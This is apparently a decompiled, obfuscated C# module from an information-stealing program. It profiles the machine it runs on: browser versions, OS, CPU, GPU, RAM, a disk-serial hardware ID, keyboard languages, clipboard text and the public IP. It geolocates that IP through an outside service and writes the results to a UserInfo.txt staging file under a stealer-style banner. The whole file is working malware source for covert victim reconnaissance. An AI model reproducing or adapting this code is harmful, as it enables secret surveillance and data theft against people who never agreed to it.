using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using ns14;
using ns18;

namespace ns37
{
	// Token: 0x0200003A RID: 58
	internal class Class23
	{
		// Token: 0x060001EF RID: 495 RVA: 0x0000F438 File Offset: 0x0000D638
		public static void smethod_0()
		{
			string text = string.Empty;
			string text2 = Class12.smethod_3();
			try
			{
				foreach (string text3 in GClass9.string_20)
				{
					if (text3.Contains("Google Chrome"))
					{
						object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
						if (value != null)
						{
							text = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
						}
						else
						{
							value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
							text = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
						}
						if (Environment.Is64BitOperatingSystem)
						{
							Class23.list_0.Add(string.Concat(new string[]
							{
								"Mozilla/5.0 (",
								text2,
								"; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
								text,
								" Safari/537.36"
							}));
						}
						else
						{
							Class23.list_0.Add(string.Concat(new string[]
							{
								"Mozilla/5.0 (",
								text2,
								") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/",
								text,
								" Safari/537.36"
							}));
						}
					}
					if (text3.Contains("Mozilla Firefox"))
					{
						object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
						if (value2 != null)
						{
							text = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
						}
						else
						{
							value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
							text = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
						}
						string text4 = string.Empty;
						text4 = text.Split(new char[]
						{
							'.'
						}).First<string>() + "." + text.Split(new char[]
						{
							'.'
						})[1];
						if (Environment.Is64BitOperatingSystem)
						{
							Class23.list_0.Add(string.Concat(new string[]
							{
								"Mozilla/5.0 (",
								text2,
								"; Win64; x64; rv:",
								text4,
								") Gecko/20100101 Firefox/",
								text4
							}));
						}
						else
						{
							Class23.list_0.Add(string.Concat(new string[]
							{
								"Mozilla/5.0 (",
								text2,
								"; rv:",
								text4,
								") Gecko/20100101 Firefox/",
								text4
							}));
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001F0 RID: 496 RVA: 0x0000F708 File Offset: 0x0000D908
		public static void smethod_1()
		{
			Class23.smethod_7();
			string text = Convert.ToString(Screen.PrimaryScreen.Bounds.Size);
			string text2 = Convert.ToString(Environment.ProcessorCount);
			string text3 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "").ToString();
			string text4 = Class23.smethod_2();
			File.WriteAllText(GClass9.string_6 + "\\UserInfo.txt", string.Concat(new string[]
			{
				"Screen Resolution: ",
				text.Replace("{", "").Replace("}", ""),
				"\r\nOS: ",
				text3,
				Class23.smethod_3(),
				"\r\nProcessesors: ",
				text2,
				"\r\nIP: ",
				Class23.string_0,
				"\r\nHWID: ",
				text4,
				"\r\nKeyboards: ",
				Class23.string_1,
				"\r\nVideo Card: ",
				Class23.smethod_8(),
				"\r\nRAM Size: ",
				Class23.smethod_9(),
				"\r\nCPU Name: ",
				Class23.smethod_6(),
				"\r\nClipboard: ",
				Clipboard.GetText(),
				Class12.string_0
			}), Encoding.Default);
		}

		// Token: 0x060001F1 RID: 497 RVA: 0x0000F8A4 File Offset: 0x0000DAA4
		public static string smethod_2()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				result = managementObject["VolumeSerialNumber"].ToString();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x060001F2 RID: 498 RVA: 0x0000F914 File Offset: 0x0000DB14
		public static string smethod_3()
		{
			string result;
			if (Environment.Is64BitOperatingSystem)
			{
				result = " x64";
			}
			else
			{
				result = " x32";
			}
			return result;
		}

		// Token: 0x060001F3 RID: 499 RVA: 0x0000F940 File Offset: 0x0000DB40
		public static string smethod_4(string string_2)
		{
			StreamReader streamReader = new StreamReader(((HttpWebResponse)((HttpWebRequest)WebRequest.Create(string_2)).GetResponse()).GetResponseStream());
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			streamReader.Dispose();
			return result;
		}

		// Token: 0x060001F4 RID: 500 RVA: 0x0000F980 File Offset: 0x0000DB80
		public static Class23.Class24 smethod_5(string string_2)
		{
			Class23.Class24 result;
			using (TextReader textReader = new StringReader(Class23.smethod_4("http://ip-api.com/xml/" + string_2)))
			{
				using (DataSet dataSet = new DataSet())
				{
					Class23.Class24 @class = new Class23.Class24();
					dataSet.ReadXml(textReader);
					@class.String_0 = dataSet.Tables[0].Rows[0][1].ToString();
					@class.String_1 = dataSet.Tables[0].Rows[0][2].ToString();
					@class.String_2 = dataSet.Tables[0].Rows[0][3].ToString();
					@class.String_3 = dataSet.Tables[0].Rows[0][4].ToString();
					@class.String_4 = dataSet.Tables[0].Rows[0][5].ToString();
					@class.String_5 = dataSet.Tables[0].Rows[0][6].ToString();
					@class.String_6 = dataSet.Tables[0].Rows[0][9].ToString();
					@class.String_7 = dataSet.Tables[0].Rows[0][10].ToString();
					Class23.list_1.Add(string.Concat(new string[]
					{
						"\r\n<===| Info |===>\r\nCountry: ",
						@class.String_0,
						"\r\nCountry Code: ",
						@class.String_1,
						"\r\nRegion: ",
						@class.String_2,
						"\r\nCity: ",
						@class.String_4,
						"\r\nZip: ",
						@class.String_5,
						"\r\nTime Zone: ",
						@class.String_6,
						"\r\nISP: ",
						@class.String_7
					}));
					result = @class;
				}
			}
			return result;
		}

		// Token: 0x060001F5 RID: 501 RVA: 0x0000FC6C File Offset: 0x0000DE6C
		public static string smethod_6()
		{
			try
			{
				using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							object obj = enumerator.Current["Name"];
							return (obj != null) ? obj.ToString() : null;
						}
					}
				}
			}
			catch
			{
			}
			return "";
		}

		// Token: 0x060001F6 RID: 502 RVA: 0x0000FD08 File Offset: 0x0000DF08
		public static void smethod_7()
		{
			foreach (object obj in InputLanguage.InstalledInputLanguages)
			{
				string str = Convert.ToString(((InputLanguage)obj).Culture);
				Class23.string_1 = Class23.string_1 + "\r\n" + str;
			}
		}

		// Token: 0x060001F7 RID: 503 RVA: 0x0000FD7C File Offset: 0x0000DF7C
		public static string smethod_8()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return Convert.ToString(((ManagementObject)enumerator.Current)["Caption"]);
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x060001F8 RID: 504 RVA: 0x0000FDFC File Offset: 0x0000DFFC
		public static string smethod_9()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementClass("Win32_ComputerSystem").GetInstances().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return Convert.ToString(Math.Round(Convert.ToDouble(((ManagementObject)enumerator.Current).Properties["TotalPhysicalMemory"].Value) / 1048576.0, 0)) + " MB";
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x040000D8 RID: 216
		public static WebRequest webRequest_0 = WebRequest.Create("http://ip.42.pl/raw");

		// Token: 0x040000D9 RID: 217
		public static Stream stream_0 = Class23.webRequest_0.GetResponse().GetResponseStream();

		// Token: 0x040000DA RID: 218
		public static string string_0 = new StreamReader(Class23.stream_0).ReadToEnd();

		// Token: 0x040000DB RID: 219
		public static string string_1 = "";

		// Token: 0x040000DC RID: 220
		public static List<string> list_0 = new List<string>();

		// Token: 0x040000DD RID: 221
		public static List<string> list_1 = new List<string>();

		// Token: 0x0200003B RID: 59
		public class Class24
		{
			// Token: 0x17000053 RID: 83
			// (get) Token: 0x060001FB RID: 507 RVA: 0x00004041 File Offset: 0x00002241
			// (set) Token: 0x060001FC RID: 508 RVA: 0x00004049 File Offset: 0x00002249
			public string String_0 { get; set; }

			// Token: 0x17000054 RID: 84
			// (get) Token: 0x060001FD RID: 509 RVA: 0x00004052 File Offset: 0x00002252
			// (set) Token: 0x060001FE RID: 510 RVA: 0x0000405A File Offset: 0x0000225A
			public string String_1 { get; set; }

			// Token: 0x17000055 RID: 85
			// (get) Token: 0x060001FF RID: 511 RVA: 0x00004063 File Offset: 0x00002263
			// (set) Token: 0x06000200 RID: 512 RVA: 0x0000406B File Offset: 0x0000226B
			public string String_2 { get; set; }

			// Token: 0x17000056 RID: 86
			// (get) Token: 0x06000201 RID: 513 RVA: 0x00004074 File Offset: 0x00002274
			// (set) Token: 0x06000202 RID: 514 RVA: 0x0000407C File Offset: 0x0000227C
			public string String_3 { get; set; }

			// Token: 0x17000057 RID: 87
			// (get) Token: 0x06000203 RID: 515 RVA: 0x00004085 File Offset: 0x00002285
			// (set) Token: 0x06000204 RID: 516 RVA: 0x0000408D File Offset: 0x0000228D
			public string String_4 { get; set; }

			// Token: 0x17000058 RID: 88
			// (get) Token: 0x06000205 RID: 517 RVA: 0x00004096 File Offset: 0x00002296
			// (set) Token: 0x06000206 RID: 518 RVA: 0x0000409E File Offset: 0x0000229E
			public string String_5 { get; set; }

			// Token: 0x17000059 RID: 89
			// (get) Token: 0x06000207 RID: 519 RVA: 0x000040A7 File Offset: 0x000022A7
			// (set) Token: 0x06000208 RID: 520 RVA: 0x000040AF File Offset: 0x000022AF
			public string String_6 { get; set; }

			// Token: 0x1700005A RID: 90
			// (get) Token: 0x06000209 RID: 521 RVA: 0x000040B8 File Offset: 0x000022B8
			// (set) Token: 0x0600020A RID: 522 RVA: 0x000040C0 File Offset: 0x000022C0
			public string String_7 { get; set; }

			// Token: 0x040000DE RID: 222
			[CompilerGenerated]
			private string string_0;

			// Token: 0x040000DF RID: 223
			[CompilerGenerated]
			private string string_1;

			// Token: 0x040000E0 RID: 224
			[CompilerGenerated]
			private string string_2;

			// Token: 0x040000E1 RID: 225
			[CompilerGenerated]
			private string string_3;

			// Token: 0x040000E2 RID: 226
			[CompilerGenerated]
			private string string_4;

			// Token: 0x040000E3 RID: 227
			[CompilerGenerated]
			private string string_5;

			// Token: 0x040000E4 RID: 228
			[CompilerGenerated]
			private string string_6;

			// Token: 0x040000E5 RID: 229
			[CompilerGenerated]
			private string string_7;
		}
	}
}
